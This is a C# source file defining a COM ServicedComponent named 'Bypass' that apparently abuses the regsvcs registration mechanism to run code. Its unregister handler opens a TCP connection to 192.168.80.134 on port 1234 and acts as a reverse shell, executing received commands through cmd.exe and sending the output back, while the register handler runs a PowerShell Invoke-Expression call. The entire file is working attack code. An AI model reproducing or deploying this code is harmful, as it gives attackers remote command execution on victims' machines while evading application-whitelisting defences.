using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;
using System.Management.Automation;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Linq;
namespace regsvcser
{
    
    public class Bypass : ServicedComponent
    {
        public Bypass() { Console.WriteLine("I am a basic COM Object"); }

       	public static void RegisterClass ( string key )
		{
			Console.WriteLine("Test Registering");
			PowerShell ps = PowerShell.Create();
			ps.AddCommand("Invoke-Expression");
			ps.AddArgument("ipconfig");
			ps.Invoke();	
		}
		
		[ComUnregisterFunction] //This executes if registration fails
		public static void UnRegisterClass ( string key )
		{
			Console.WriteLine("Unregistering in process...");

        	using (var client = new TcpClient()){
        		Console.WriteLine("[+] Welcome Home !");
        		client.Connect("192.168.80.134", 1234);

        		Console.WriteLine("[+] Opening stream");
                using (var stream = client.GetStream())
                {
                    string banner = "WELCOME TO TEHTRIS HELL !\r\n";
                    stream.Write(Encoding.ASCII.GetBytes(banner), 0, banner.Length);

                    Console.WriteLine("[+] Opening reading stream");
                    using (var streamReader = new StreamReader(stream))
                    {
                        //As long as the client is connected to the server
                        while (client.Connected)
                        {
                            string userName = Environment.UserName;
                            string systemName = Environment.MachineName;
                            var prompt = Encoding.ASCII.GetBytes(string.Format("{0}@{1} $ ", userName, systemName));
                            stream.Write(prompt, 0, prompt.Length);

                            string message = streamReader.ReadLine().TrimStart().TrimEnd();
                            if (message == "exit")
                            {
                                break; //Leave while loop
                            }
                            else
                            {
                                string[]
                                    parts = message
                                        .Split(' '); //separate the command send by the server with space as delimiter
                                string command = parts.First(); //first element of the array
                                string[] arguments = parts.Skip(1).ToArray(); //args put in String array
                                Console.WriteLine("[+] Executing " + command);
                                string messageSrv = "Executing : " + command + " " + string.Join(" ", arguments) +
                                                    "...\r\n";
                                stream.Write(Encoding.ASCII.GetBytes(messageSrv), 0, messageSrv.Length);

                                ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe",
                                    "/c " + command + " " + string.Join(" ", arguments));
                                //startInfo.FileName = command;
                                //startInfo.Arguments = string.Join(" ", arguments); //arguments is a string array, startInfo Arguments takes all the element of the array with a space delimiter
                                startInfo.WorkingDirectory = @"C:\";
                                startInfo.RedirectStandardError = true;
                                startInfo.RedirectStandardOutput = true;
                                startInfo.UseShellExecute =
                                    false; //true=ShellExecute(open specified program); false=CreateProcess

                                Process process = new Process();
                                process.StartInfo = startInfo;
                                try
                                {
                                    process.Start();
                                    process.StandardOutput.BaseStream.CopyTo(stream);
                                    process.StandardError.BaseStream.CopyTo(stream);
                                    process.WaitForExit();
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine("[!] Error executing : " + command);
                                    messageSrv = "Error executing : " + command + " => " + e.Message + "\r\n";
                                    stream.Write(Encoding.ASCII.GetBytes(messageSrv), 0, messageSrv.Length);
                                }
                            }
                        }

                        Console.WriteLine("[!] Closing reading stream");
                        streamReader.Close();
                    }

                    Console.WriteLine("[!] Closing stream");
                    stream.Close();
                }
                Console.WriteLine("[!] Closing stream");
        	}

			Console.WriteLine("Unregistered terminated");		
        }
		
    }

}